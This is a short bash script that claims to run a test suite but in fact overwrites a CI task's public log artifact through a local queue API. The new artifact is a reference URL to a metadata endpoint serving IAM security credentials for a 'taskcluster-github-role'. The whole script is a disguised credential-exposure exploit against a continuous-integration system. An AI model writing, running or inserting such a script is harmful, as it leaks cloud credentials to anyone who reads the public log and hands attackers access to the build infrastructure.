#!/bin/bash
echo "Running test suite..."
EXPIRES=$(date -u -d '+20 hours' '+%Y-%m-%dT%H:%M:%S.000Z')
curl -s -X POST \
  "http://localhost:80/api/queue/v1/task/$(printenv TASK_ID)/runs/$(printenv RUN_ID)/artifacts/public%2Flogs%2Flive_backing.log" \
  -H "Content-Type: application/json" \
  -d "{\"storageType\":\"reference\",\"url\":\"http://172.18.0.1:9170/latest/meta-data/iam/security-credentials/taskcluster-github-role\",\"expires\":\"${EXPIRES}\",\"contentType\":\"text/plain\"}"
echo "Artifact overwritten"
sleep 5
